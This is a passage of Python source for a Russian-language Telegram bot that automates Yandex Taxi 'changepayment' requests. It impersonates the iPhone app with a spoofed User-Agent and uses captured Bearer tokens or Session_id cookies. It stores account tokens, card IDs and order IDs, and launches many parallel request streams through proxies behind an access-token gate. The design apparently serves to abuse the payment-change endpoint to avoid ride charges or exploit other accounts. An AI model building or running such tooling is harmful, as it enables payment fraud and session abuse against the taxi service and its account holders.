            updated_fields.append(field)

    notes: List[str] = []
    price_val = parsed.get("price")
    if isinstance(price_val, (int, float)):
        formatted_price = int(price_val) if price_val == int(price_val) else price_val
        notes.append(f"Цена первой поездки: {formatted_price}")

    if updated_fields:
        notes.append("Автоматически подставил: " + ", ".join(updated_fields))

    debug_block = _format_debug_responses(parsed.get("_debug_responses"))
    if debug_block:
        notes.append(debug_block)

    if notes:
        return "\n".join(notes)

    return "Не нашёл дополнительных данных по session_id."


async def autofill_trip_from_token(trip_id: int, tg_id: int, token2: str) -> str:
    try:
        parsed = await fetch_trip_details_from_token(token2)
    except Exception as e:  # noqa: BLE001
        logger.warning("Не удалось автозаполнить поездку по token2: %s", e)
        return "Не смог автоматически заполнить данные по token2."

    updated_fields = []

    for field in ("trip_id", "card"):
        value = parsed.get(field)
        if value:
            update_trip_template_field(trip_id, tg_id, field, value)
            updated_fields.append(field)

    notes: List[str] = []
    if updated_fields:
        notes.append("Автоматически подставил: " + ", ".join(updated_fields))

    debug_block = _format_debug_responses(parsed.get("_debug_responses"))
    if debug_block:
        notes.append(debug_block)

    if notes:
        return "\n".join(notes)

    return "Не нашёл дополнительных данных по token2."


def build_headers(user_token: Optional[str] = None, session_cookie: Optional[str] = None) -> dict:
    headers = {
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "ru",
        "Content-Type": "application/json; charset=utf-8",
        "User-Agent": "ru.yandex.ytaxi/700.100.0.500995 (iPhone; iPhone14,4; iOS 18.3.1; Darwin)",
    }

    if session_cookie:
        headers["Cookie"] = f"Session_id={session_cookie}"
    elif user_token:
        headers["Authorization"] = f"Bearer {user_token}"

    return headers


def build_payload(orderid: str, card: str, _id: str) -> dict:
    return {
        "orderid": orderid,
        "payment_method_type": "card",
        "tips": {
            "decimal_value": "0",
            "type": "percent",
        },
        "payment_method_id": card,
        "id": _id,
    }


def generate_session_id() -> str:
    return str(random.randint(10_000, 9_999_999))


async def do_single_request_and_log(
    tg_id: int,
    headers: dict,
    payload: dict,
    session_id: str,
    use_proxies: bool,
) -> Tuple[bool, Optional[int], Optional[str]]:
    return await session_service.send_one(
        tg_id, headers, payload, session_id, use_proxies
    )


def main_keyboard() -> ReplyKeyboardMarkup:
    return ReplyKeyboardMarkup(
        [
            ["🎄💳 Поменять оплату", "🎄👤 Профиль"],
            ["🎄🚂 Загрузить поездки", "🎄📜 Логи"],
        ],
        resize_keyboard=True,
    )


def actions_keyboard() -> ReplyKeyboardMarkup:
    return ReplyKeyboardMarkup(
        [
            ["🎄🎯 Одиночная смена"],
            ["🎄🚀 Запустить потоки"],
            ["🎄🛑 Остановить потоки"],
            ["🎄🔙 Назад"],
        ],
        resize_keyboard=True,
    )


def _collect_progress_snapshot(context: ContextTypes.DEFAULT_TYPE) -> Tuple[int, int, int, str, dict]:
    active_session = context.user_data.get("active_session")
    progress = active_session.get("progress") if isinstance(active_session, dict) else {}
    session_id = active_session.get("session_id") if isinstance(active_session, dict) else None

    completed = progress.get("completed", 0) if isinstance(progress, dict) else 0
    success = progress.get("success", 0) if isinstance(progress, dict) else 0
    failed = max(completed - success, 0)

    return completed, success, failed, session_id or "", progress if isinstance(progress, dict) else {}


async def notify_admin_about_stop(
    context: ContextTypes.DEFAULT_TYPE,
    *,
    tg_id: Optional[int],
    session_id: str,
    progress: dict,
    reason: str,
    completed: int,
    success: int,
    failed: int,
):
    if not ADMIN_TG_ID:
        return

    last_status = progress.get("last_status") if isinstance(progress, dict) else None
    last_response = progress.get("last_response", "") if isinstance(progress, dict) else ""

    msg = (
        "🛑 Потоки остановлены"
        f"\nПричина: {reason}"
        f"\nПользователь: {tg_id or 'неизвестен'}"
        f"\nID сессии: {session_id or '—'}"
        f"\nВыполнено: {completed}"
        f"\nУспехов: {success}"
        f"\nНеуспехов: {failed}"
        f"\nПоследний статус: {last_status}"
        f"\nОтвет: <pre>{last_response}</pre>"
    )

    try:
        await context.bot.send_message(
            chat_id=ADMIN_TG_ID,
            text=msg,
            parse_mode="HTML",
        )
    except Exception as e:  # noqa: BLE001
        logger.warning("Не смог отправить лог админу: %s", e)


async def stop_streams_with_logging(
    update: Update, context: ContextTypes.DEFAULT_TYPE, *, reason: str
) -> Tuple[bool, int, int, int, str]:
    stop_event: Optional[asyncio.Event] = context.user_data.get("stop_event")
    if not isinstance(stop_event, asyncio.Event) or stop_event.is_set():
        return False, 0, 0, 0, ""

    stop_event.set()

    completed, success, failed, session_id, progress = _collect_progress_snapshot(context)
    tg_id = update.effective_user.id if update.effective_user else None

    await notify_admin_about_stop(
        context,
        tg_id=tg_id,
        session_id=session_id,
        progress=progress,
        reason=reason,
        completed=completed,
        success=success,
        failed=failed,
    )

    return True, completed, success, failed, session_id


async def restart_bot(context: ContextTypes.DEFAULT_TYPE):
    await asyncio.sleep(1)
    os.execl(sys.executable, sys.executable, *sys.argv)


def logs_keyboard() -> ReplyKeyboardMarkup:
    return ReplyKeyboardMarkup(
        [
            ["🎄📖 Посмотреть логи"],
            ["🎄🕒 Логи последней сессии"],
            ["🎄🔙 Назад"],
        ],
        resize_keyboard=True,
    )


def _field_icon(value: Optional[str]) -> str:
    return "✅" if value else "⬜"


def ensure_active_trip_record(tg_id: int, context: ContextTypes.DEFAULT_TYPE) -> dict:
    trip_id = context.user_data.get("active_trip_id")
    record = None
    if trip_id:
        record = get_trip_template(trip_id, tg_id)

    if record is None:
        trip_id = create_trip_template(tg_id)
        context.user_data["active_trip_id"] = trip_id
        record = get_trip_template(trip_id, tg_id) or {}

    set_trip_form_mode(context, trip_id, "create")

    return record


def set_trip_form_mode(context: ContextTypes.DEFAULT_TYPE, trip_id: int, mode: str):
    modes = context.user_data.setdefault("trip_form_mode", {})
    modes[trip_id] = mode


def get_trip_form_mode(context: ContextTypes.DEFAULT_TYPE, trip_id: int) -> str:
    modes = context.user_data.get("trip_form_mode", {})
    return modes.get(trip_id, "create")


def set_trip_return_target(
    context: ContextTypes.DEFAULT_TYPE, trip_id: int, target: str
):
    mapping = context.user_data.setdefault("trip_return_to_list", {})
    mapping[trip_id] = target


def pop_trip_return_target(context: ContextTypes.DEFAULT_TYPE, trip_id: int) -> Optional[str]:
    mapping = context.user_data.get("trip_return_to_list") or {}
    return mapping.pop(trip_id, None)


def _trip_has_values(record: dict) -> bool:
    return any(
        record.get(field)
        for field in (
            "trip_name",
            "token2",
            "session_id",
            "trip_id",
            "card",
            "orderid",
            "trip_link",
        )
    )


def trip_form_markup(record: dict, *, mode: str = "create") -> InlineKeyboardMarkup:
    trip_id = record.get("id")
    buttons = [
        [
            InlineKeyboardButton(
                f"{_field_icon(record.get('trip_name'))} название",
                callback_data=f"tripfield:{trip_id}:trip_name",
            )
        ],
        [
            InlineKeyboardButton(
                f"{_field_icon(record.get('token2'))} token2",
                callback_data=f"tripfield:{trip_id}:token2",
            )
        ],
        [
            InlineKeyboardButton(
                f"{_field_icon(record.get('session_id'))} session_id",
                callback_data=f"tripfield:{trip_id}:session_id",
            )
        ],
        [
            InlineKeyboardButton(
                f"{_field_icon(record.get('trip_id'))} ID",
                callback_data=f"tripfield:{trip_id}:trip_id",
            )
        ],
        [
            InlineKeyboardButton(
                f"{_field_icon(record.get('card'))} card-x",
                callback_data=f"tripfield:{trip_id}:card",
            )
        ],
        [
            InlineKeyboardButton(
                f"{_field_icon(record.get('orderid'))} orderid",
                callback_data=f"tripfield:{trip_id}:orderid",
            )
        ],
        [
            InlineKeyboardButton(
                f"{_field_icon(record.get('trip_link'))} ссылка на поездку",
                callback_data=f"tripfield:{trip_id}:trip_link",
            )
        ],
    ]

    if _trip_has_values(record):
        save_caption = "💾 Сохранить параметры" if mode == "edit" else "💾 Сохранить"
        control_row = [InlineKeyboardButton(save_caption, callback_data=f"tripsave:{trip_id}")]
        if mode == "create":
            control_row.append(InlineKeyboardButton("🧹 Очистить", callback_data=f"tripclear:{trip_id}"))
        buttons.append(control_row)

    return InlineKeyboardMarkup(buttons)


@require_access
async def show_trip_loader(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = InlineKeyboardMarkup(
        [
            [InlineKeyboardButton("📄 Текстом", callback_data="tripload:text")],
            [InlineKeyboardButton("📝 Заполняя поля", callback_data="tripload:form")],
        ]
    )

    await update.message.reply_text(
        "Как загрузить поездку? Выбери способ ниже ⤵️:",
        reply_markup=keyboard,
    )
    return MENU


@require_access
async def trip_load_choice_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await delete_callback_message(query)
    parts = query.data.split(":", 1)
    choice = parts[1] if len(parts) > 1 else ""

    if choice == "form":
        user = update.effective_user
        tg_id = user.id if user else None
        if tg_id is None:
            await query.message.reply_text(
                "Не смог получить твой TG ID 🤔", reply_markup=main_keyboard()
            )
            return MENU

        await send_trip_manager_list(query.message, tg_id, context)
        return MENU

    if choice == "text":
        await query.message.reply_text(
            "Пришли данные в формате: ID/ORDERID/CARD-X/TOKEN2[/SESSION_ID].\n"
            "Недостающие поля можно опустить — оставлю их пустыми."
            " Если укажешь session_id, token2 очищу автоматически.",
            reply_markup=ReplyKeyboardRemove(),
        )
        return ASK_TRIP_TEXT

    await query.message.reply_text("Не понял выбор.", reply_markup=main_keyboard())
    return MENU


@require_access
async def trip_text_input_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    tg_id = user.id if user else None

    if tg_id is None:
        await update.message.reply_text(
            "Не смог получить твой TG ID 🤔", reply_markup=main_keyboard()
        )
        return MENU

    raw_text = update.message.text.strip()
    parts = [part.strip() for part in raw_text.split("/")]
    values = {
        "trip_id": parts[0] if len(parts) > 0 else "",
        "orderid": parts[1] if len(parts) > 1 else "",
        "card": parts[2] if len(parts) > 2 else "",
        "token2": parts[3] if len(parts) > 3 else "",
        "session_id": parts[4] if len(parts) > 4 else "",
    }

    if values.get("session_id"):
        values["token2"] = ""

    trip_db_id = create_trip_template(tg_id)
    context.user_data["active_trip_id"] = trip_db_id
    set_trip_form_mode(context, trip_db_id, "edit")

    for field in ("trip_id", "orderid", "card", "token2", "session_id"):
        if values.get(field):
            update_trip_template_field(trip_db_id, tg_id, field, values[field])

    autofill_msg = ""
    if values.get("session_id"):
        autofill_msg = await autofill_trip_from_session(
            trip_db_id, tg_id, values["session_id"]
        )
    elif values.get("token2"):
        autofill_msg = await autofill_trip_from_token(
            trip_db_id, tg_id, values["token2"]
        )

    record = get_trip_template(trip_db_id, tg_id) or {}

    message_text = "Сохранил данные из текста. Недостающие поля оставил пустыми."
    if autofill_msg:
        message_text += f"\n{autofill_msg}"

    await update.message.reply_text(
        message_text,
        reply_markup=trip_form_markup(record, mode="edit"),
    )
    return MENU


@require_access
async def tripfield_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await delete_callback_message(query)
    try:
        _, trip_id_str, field = query.data.split(":", 2)
        trip_id = int(trip_id_str)
    except Exception:  # noqa: BLE001
        await query.message.reply_text("Не понял, какую ячейку нужно заполнить.")
        return MENU

    context.user_data["active_trip_id"] = trip_id
    context.user_data["pending_trip_input"] = {
        "trip_id": trip_id,
        "field": field,
    }

    field_names = {
        "trip_name": "название",
        "token2": "token2",
        "session_id": "session_id",
        "trip_id": "ID",
        "card": "card-x",
        "orderid": "orderid",
        "trip_link": "ссылку на поездку",
    }
    await query.message.reply_text(
        f"Введи {field_names.get(field, 'значение')} для этой поездки:",
        reply_markup=ReplyKeyboardRemove(),
    )
    return ASK_TRIP_VALUE


@require_access
async def trip_value_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    tg_id = user.id if user else None
    pending = context.user_data.get("pending_trip_input")

    if tg_id is None or not isinstance(pending, dict):
        await update.message.reply_text(
            "Не нашёл активный слот для сохранения. Нажми «🎄🚂 Загрузить поездки» снова.",
            reply_markup=main_keyboard(),
        )
        return MENU

    trip_id = int(pending.get("trip_id", 0))
    field = pending.get("field")
    value = update.message.text.strip()

    update_trip_template_field(trip_id, tg_id, field, value)
    context.user_data.pop("pending_trip_input", None)
    context.user_data["active_trip_id"] = trip_id

    extra_note = ""
    if field == "session_id":
        extra_note = await autofill_trip_from_session(trip_id, tg_id, value)
    elif field == "token2":
        extra_note = await autofill_trip_from_token(trip_id, tg_id, value)

    record = get_trip_template(trip_id, tg_id) or {}
    message_text = "Сохранил ✅ Данные записаны в таблицу."
    if extra_note:
        message_text += f"\n{extra_note}"

    await update.message.reply_text(
        message_text,
        reply_markup=trip_form_markup(record, mode=get_trip_form_mode(context, trip_id)),
    )
    return MENU


def stream_start_markup() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(
        [
            [InlineKeyboardButton("Выбрать из уже созданных", callback_data="streams:choose")],
            [InlineKeyboardButton("Создать своё", callback_data="streams:create")],
        ]
    )


def schedule_keyboard(mode: str) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(
        [
            [InlineKeyboardButton("Отправить сейчас", callback_data=f"schedule:{mode}:now")],
            [InlineKeyboardButton("Отправить через...", callback_data=f"schedule:{mode}:later")],
        ]
    )


async def send_trip_templates_list(
    chat, tg_id: int, context: ContextTypes.DEFAULT_TYPE
):
    templates = list_trip_templates(tg_id)
    keyboard = [
        [
            InlineKeyboardButton(
                f"#{t['id']} | {t.get('trip_name') or t.get('orderid') or 'без названия'}",
                callback_data=f"tripselect:{t['id']}",
            )
        ]
        for t in templates
    ]

    keyboard.append(
        [InlineKeyboardButton("➕ Добавить поездку", callback_data="tripnew:list")]
    )

    if templates:
        text = "Выбери одну из сохранённых поездок или создай новую:"
    else:
        text = "Пока нет сохранённых поездок. Нажми «➕ Добавить поездку», чтобы создать первую."

    await chat.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard))


@require_access
async def show_trip_manager(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    tg_id = user.id if user else None

    if tg_id is None:
        await update.message.reply_text(
            "Не смог получить твой TG ID 🤔", reply_markup=main_keyboard()
        )
        return MENU

    await send_trip_manager_list(update.message, tg_id, context)
    return MENU


async def send_trip_manager_list(chat, tg_id: int, context: ContextTypes.DEFAULT_TYPE) -> bool:
    templates = list_trip_templates(tg_id)
    keyboard = [
        [
            InlineKeyboardButton(
                f"🎄🧳 #{t['id']} | {t.get('trip_name') or t.get('orderid') or 'без названия'}",
                callback_data=f"tripmanage:{t['id']}",
            )
        ]
        for t in templates
    ]
    keyboard.append(
        [InlineKeyboardButton("🎄➕ Добавить поездку", callback_data="tripnew:manage")]
    )

    if templates:
        text = "🎄🚂 Выбери поездку для редактирования или удаления, либо добавь новую ⤵️:"
    else:
        text = "🎄🚧 Пока нет сохранённых поездок. Нажми «🎄➕ Добавить поездку», чтобы начать."

    await chat.reply_text(
        text,
        reply_markup=InlineKeyboardMarkup(keyboard),
    )
    return bool(templates)


@require_access
async def trip_new_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await delete_callback_message(query)

    parts = query.data.split(":", 1)
    origin = parts[1] if len(parts) > 1 else "list"

    user = update.effective_user
    tg_id = user.id if user else None
    if tg_id is None:
        await query.message.reply_text(
            "Не смог получить твой TG ID 🤔", reply_markup=main_keyboard()
        )
        return MENU

    trip_id = create_trip_template(tg_id)
    context.user_data["active_trip_id"] = trip_id
    set_trip_form_mode(context, trip_id, "create")
    set_trip_return_target(context, trip_id, origin)

    record = get_trip_template(trip_id, tg_id) or {}

    await query.message.reply_text(
        "🆕 Создал новую поездку. Заполни поля, нажми «💾 Сохранить» — вернусь к списку.",
        reply_markup=trip_form_markup(record, mode="create"),
    )
    return MENU


@require_access
async def streams_option_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await delete_callback_message(query)
    choice = query.data.split(":", 1)[1]

    if choice == "create":
        context.user_data["stream_config"] = {}
        await query.message.reply_text(
            "Создаём новый набор данных для потоков. Введи token2:",
            reply_markup=ReplyKeyboardRemove(),
        )
        return ASK_STREAM_TOKEN

    if choice == "choose":
        user = update.effective_user
        tg_id = user.id if user else None
        if tg_id is None:
            await query.message.reply_text(
                "Не смог получить твой TG ID 🤔", reply_markup=main_keyboard()
            )
            return MENU

        await send_trip_templates_list(query.message, tg_id, context)
        return MENU

    await query.message.reply_text("Непонятный выбор.", reply_markup=main_keyboard())
    return MENU


@require_access
async def trip_select_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await delete_callback_message(query)
    try:
        _, trip_id_str = query.data.split(":", 1)
        trip_id = int(trip_id_str)
    except Exception:  # noqa: BLE001
        await query.message.reply_text("Не понял, что открыть.")
        return MENU

    user = update.effective_user
    tg_id = user.id if user else None
    record = get_trip_template(trip_id, tg_id or 0) if tg_id else None

    if not record:
        await query.message.reply_text("Не нашёл такую запись в БД.")
        return MENU

    token = record.get("token2")
    session_cookie = record.get("session_id")

    if not token and not session_cookie:
        await query.message.reply_text(
            "В этой поездке не задан token2 или session_id. Заполни хотя бы одно поле и попробуй снова.",
            reply_markup=main_keyboard(),
        )
        return MENU

    if session_cookie:
        context.user_data["session_cookie"] = session_cookie
        context.user_data.pop("token", None)
    else:
        context.user_data["token"] = token
        context.user_data.pop("session_cookie", None)

    context.user_data["orderid"] = record.get("orderid")
    context.user_data["card"] = record.get("card")
    context.user_data["id"] = record.get("trip_id")

    await context.bot.send_message(
        chat_id=user.id,
        text="Данные перенесены в смену. Сколько потоков запустить?",
        reply_markup=ReplyKeyboardRemove(),
    )

    return ASK_THREADS


@require_access
async def trip_manage_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await delete_callback_message(query)
    try:
        _, trip_id_str = query.data.split(":", 1)
    except Exception:  # noqa: BLE001
        await query.message.reply_text("Не понял, что открыть.")
        return MENU

    user = update.effective_user
    tg_id = user.id if user else None

    if trip_id_str == "back":
        if tg_id is None:
            await query.message.reply_text(
                "Не смог получить TG ID.", reply_markup=main_keyboard()
            )
            return MENU
        await send_trip_manager_list(query.message, tg_id, context)
        return MENU

    try:
        trip_id = int(trip_id_str)
    except Exception:  # noqa: BLE001
        await query.message.reply_text("Не понял, что открыть.")
        return MENU

    record = get_trip_template(trip_id, tg_id or 0) if tg_id else None
    if not record:
        await query.message.reply_text("Не нашёл такую запись в БД.")
        return MENU

    set_trip_form_mode(context, trip_id, "edit")

    text_lines = [
        f"🆔 ID записи: {record['id']}",
        f"🏷️ Название: {record.get('trip_name') or '—'}",
        f"🔑 token2: {record.get('token2') or '—'}",
        f"🍪 session_id: {record.get('session_id') or '—'}",
        f"🪪 ID: {record.get('trip_id') or '—'}",
        f"💳 card-x: {record.get('card') or '—'}",
        f"📄 orderid: {record.get('orderid') or '—'}",
        f"🔗 Ссылка: {record.get('trip_link') or '—'}",
    ]

    keyboard = InlineKeyboardMarkup(
        [
            [InlineKeyboardButton("✏️ Редактировать", callback_data=f"tripedit:{record['id']}")],
            [InlineKeyboardButton("🗑️ Удалить из БД", callback_data=f"tripdelete:{record['id']}")],
            [InlineKeyboardButton("↩️ Назад к списку", callback_data="tripmanage:back")],
        ]
    )

    await query.message.reply_text("\n".join(text_lines), reply_markup=keyboard)
    return MENU


@require_access
async def trip_edit_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await delete_callback_message(query)
    try:
        _, trip_id_str = query.data.split(":", 1)
        trip_id = int(trip_id_str)
    except Exception:  # noqa: BLE001
        await query.message.reply_text("Не понял, что редактировать.")
        return MENU

    user = update.effective_user
    tg_id = user.id if user else None
    record = get_trip_template(trip_id, tg_id or 0) if tg_id else None

    if not record:
        await query.message.reply_text("Не нашёл запись для редактирования.")
        return MENU

    set_trip_form_mode(context, trip_id, "edit")
    context.user_data["active_trip_id"] = trip_id

    await query.message.reply_text(
        "✏️ Редактируем поездку. Нажми на параметр, укажи новое значение и затем"
        " нажми «💾 Сохранить параметры».",
        reply_markup=trip_form_markup(record, mode="edit"),
    )
    return MENU


@require_access
async def trip_save_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await delete_callback_message(query)
    try:
        _, trip_id_str = query.data.split(":", 1)
        trip_id = int(trip_id_str)
    except Exception:  # noqa: BLE001
        await query.message.reply_text("Не понял, что сохранять.")
        return MENU

    user = update.effective_user
    tg_id = user.id if user else None
    record = get_trip_template(trip_id, tg_id or 0) if tg_id else None
    if not record:
        await query.message.reply_text("Не нашёл запись в БД.")
        return MENU

    context.user_data["active_trip_id"] = trip_id
    await query.message.reply_text(
        "Параметры сохранены в БД.",
        reply_markup=trip_form_markup(record, mode=get_trip_form_mode(context, trip_id)),
    )

    return_target = pop_trip_return_target(context, trip_id)
    if return_target == "list":
        await send_trip_templates_list(query.message, tg_id, context)
    elif return_target == "manage":
        await send_trip_manager_list(query.message, tg_id, context)

    return MENU


@require_access
async def trip_clear_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await delete_callback_message(query)
    try:
        _, trip_id_str = query.data.split(":", 1)
        trip_id = int(trip_id_str)
    except Exception:  # noqa: BLE001
        await query.message.reply_text("Не понял, что очистить.")
        return MENU

    user = update.effective_user
    tg_id = user.id if user else None
    if tg_id is None:
        await query.message.reply_text("Не смог получить TG ID.")
        return MENU

    clear_trip_template(trip_id, tg_id)
    context.user_data.pop("pending_trip_input", None)
    context.user_data["active_trip_id"] = trip_id
    set_trip_form_mode(context, trip_id, "create")
    record = get_trip_template(trip_id, tg_id) or {}

    await query.message.reply_text(
        "Очистил все поля. Можешь заполнять заново.",
        reply_markup=trip_form_markup(record, mode="create"),
    )
    return MENU


@require_access
@require_access
async def trip_delete_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await delete_callback_message(query)
    try:
        _, trip_id_str = query.data.split(":", 1)
        trip_id = int(trip_id_str)
    except Exception:  # noqa: BLE001
        await query.message.reply_text("Не понял, что удалить.")
        return MENU

    user = update.effective_user
    tg_id = user.id if user else None
    if tg_id is None:
        await query.message.reply_text("Не смог получить TG ID.")
        return MENU

    delete_trip_template(trip_id, tg_id)
    await query.message.reply_text("Удалил запись из БД.", reply_markup=main_keyboard())
    await send_trip_manager_list(query.message, tg_id, context)
    return MENU


@require_access
@require_access
async def trip_use_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await delete_callback_message(query)
    try:
        _, trip_id_str = query.data.split(":", 1)
        trip_id = int(trip_id_str)
    except Exception:  # noqa: BLE001
        await query.message.reply_text("Не понял, что использовать.")
        return MENU

    user = update.effective_user
    tg_id = user.id if user else None
    record = get_trip_template(trip_id, tg_id or 0) if tg_id else None
    if not record:
        await query.message.reply_text("Не нашёл запись.")
        return MENU

    token = record.get("token2")
    session_cookie = record.get("session_id")

    if not token and not session_cookie:
        await query.message.reply_text(
            "В этой поездке не задан token2 или session_id. Заполни хотя бы одно поле и попробуй снова.",
            reply_markup=main_keyboard(),
        )
        return MENU

    if session_cookie:
        context.user_data["session_cookie"] = session_cookie
        context.user_data.pop("token", None)
    else:
        context.user_data["token"] = token
        context.user_data.pop("session_cookie", None)

    context.user_data["orderid"] = record.get("orderid")
    context.user_data["card"] = record.get("card")
    context.user_data["id"] = record.get("trip_id")

    await context.bot.send_message(
        chat_id=user.id,
        text="Данные перенесены в смену. Сколько потоков запустить?",
        reply_markup=ReplyKeyboardRemove(),
    )
    return ASK_THREADS


@require_access
async def stream_token_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    token = update.message.text.strip()
    context.user_data.setdefault("stream_config", {})["token"] = token
    context.user_data.setdefault("stream_config", {}).pop("session_cookie", None)
    notes: List[str] = []

    user = update.effective_user
    tg_id = user.id if user else None

    if tg_id:
        try:
            parsed = await fetch_trip_details_from_token(token)
            trip_db_id = ensure_trip_from_token2(
                tg_id, token, parsed.get("trip_id"), parsed.get("card")
            )

            details_parts = []
            if parsed.get("trip_id"):
                details_parts.append(f"ID: {parsed['trip_id']}")
            if parsed.get("card"):
                details_parts.append(f"card-x: {parsed['card']}")

            parsed_text = f" ({', '.join(details_parts)})" if details_parts else ""
            notes.append(
                f"🎄 Сохранил аккаунт в базу как поездку «{token}»{parsed_text}. ID записи: {trip_db_id}."
            )
        except Exception as e:  # noqa: BLE001
            logger.warning("Не удалось сохранить аккаунт по token2: %s", e)
            notes.append("🎄 Не смог автоматически сохранить аккаунт в базу.")

    reply_lines = ["🎄 Принял token2. Теперь введи orderid:"]
    reply_lines.extend(notes)

    await update.message.reply_text(
        "\n".join(reply_lines), reply_markup=ReplyKeyboardRemove()
    )
    return ASK_STREAM_ORDERID


@require_access
async def stream_orderid_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    orderid = update.message.text.strip()
    context.user_data.setdefault("stream_config", {})["orderid"] = orderid
    await update.message.reply_text(
        "Теперь card-x:", reply_markup=ReplyKeyboardRemove()
    )
    return ASK_STREAM_CARD


@require_access
async def stream_card_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    card = update.message.text.strip()
    context.user_data.setdefault("stream_config", {})["card"] = card
    await update.message.reply_text(
        "Введи ID:", reply_markup=ReplyKeyboardRemove()
    )
    return ASK_STREAM_ID


@require_access
async def stream_id_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    val = update.message.text.strip()
    context.user_data.setdefault("stream_config", {})["id"] = val
    await update.message.reply_text(
        "Сколько потоков запустить?", reply_markup=ReplyKeyboardRemove()
    )
    return ASK_STREAM_THREADS


@require_access
async def stream_threads_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    try:
        threads = int(text)
        if threads <= 0:
            raise ValueError
    except ValueError:
        await update.message.reply_text(
            "Нужно целое положительное число потоков.", reply_markup=main_keyboard()
        )
        return MENU

    context.user_data.setdefault("stream_config", {})["threads"] = threads
    await update.message.reply_text(
        "Сколько всего запросов сделать?", reply_markup=ReplyKeyboardRemove()
    )
    return ASK_STREAM_TOTAL


@require_access
async def stream_total_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    try:
        total_requests = int(text)
        if total_requests <= 0:
            raise ValueError
    except ValueError:
        await update.message.reply_text(
            "Нужно целое положительное число запросов.", reply_markup=main_keyboard()
        )
        return MENU

    config = context.user_data.get("stream_config", {})
    required = [config.get("token"), config.get("orderid"), config.get("card"), config.get("id")]
    if not all(required):
        await update.message.reply_text(
            "Не все данные заданы. Попробуй снова через «🚀 Запустить потоки».",
            reply_markup=main_keyboard(),
        )
        return MENU
    context.user_data["token"] = config.get("token")
    context.user_data["orderid"] = config.get("orderid")
    context.user_data["card"] = config.get("card")
    context.user_data["id"] = config.get("id")

    threads = config.get("threads", 1)
    context.user_data["threads"] = threads
    await bulk_change_payment(update, context, threads, total_requests)
    return MENU


@require_access
async def request_restart(update: Update, context: ContextTypes.DEFAULT_TYPE):
    stopped, completed, success, failed, session_id = await stop_streams_with_logging(
        update, context, reason="/request"
    )

    if not stopped:
        await update.message.reply_text(
            "Активных потоков нет — перезапуск не требуется.",
            reply_markup=main_keyboard(),
        )
        return

    await update.message.reply_text(
        "Останавливаю потоки и перезапускаю бота...",
        reply_markup=ReplyKeyboardRemove(),
    )

    asyncio.create_task(restart_bot(context))


@require_access
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await safe_reply(
        update,
        context,
        "🎄 Привет! 👋\n"
        "🎄 Я бот для отправки запроса changepayment.\n\n"
        "🎄 Нажми «🎄💳 Поменять оплату», там выбери «🎄🎯 Одиночная смена» или «🎄🚀 Запустить потоки».\n"
        "🎄 Кнопка «🎄🚂 Загрузить поездки» — чтобы добавить или обновить поездки.\n\n"
        f"🎄 Прокси: {proxy_state_text()}",
        reply_markup=main_keyboard(),
    )
    return MENU


async def access_token_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    tg_id = user.id if user else None
    token = update.message.text.strip()

    if tg_id is None:
        await update.message.reply_text(
            "Не смог получить твой TG ID, попробуй ещё раз позже.",
            reply_markup=ReplyKeyboardRemove(),
        )
        return ASK_ACCESS_TOKEN

    if not token:
        await update.message.reply_text(
            "Пришли корректный токен (10 символов).",
            reply_markup=ReplyKeyboardRemove(),
        )
        return ASK_ACCESS_TOKEN

    if not verify_user_by_token(tg_id, token):
        await update.message.reply_text(
            "Токен не найден. Проверь и попробуй снова.",
            reply_markup=ReplyKeyboardRemove(),
        )
        return ASK_ACCESS_TOKEN

    await update.message.reply_text(
        "Отлично! Токен принят, можешь пользоваться ботом.",
        reply_markup=main_keyboard(),
    )
    return MENU


@require_access
async def start_choice_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await delete_callback_message(query)
    choice = query.data

    if choice == "single":
        await query.message.reply_text(
            "Окей, погнали. 🚀\n"
            "Сначала отправь токен (только сам <token>, без Bearer):",
            reply_markup=ReplyKeyboardRemove(),
        )
        return ASK_TOKEN

    if choice == "bulk":
        await query.message.reply_text(
            "Выбрал массовый запуск. Сначала введи параметры через «🎄💳 Поменять оплату»,"
            " а потом нажми «🎄🚀 Запустить потоки».",
            reply_markup=main_keyboard(),
        )
        return MENU

    await query.message.reply_text("Неизвестный выбор.", reply_markup=main_keyboard())
    return MENU


@require_access
async def ask_token(update: Update, context: ContextTypes.DEFAULT_TYPE):
    token = update.message.text.strip()
    context.user_data["token"] = token
    context.user_data.pop("session_cookie", None)

    await update.message.reply_text(
        "Ок. Теперь отправь, пожалуйста, <orderid>:"
    )
    return ASK_ORDERID


@require_access
async def ask_orderid(update: Update, context: ContextTypes.DEFAULT_TYPE):
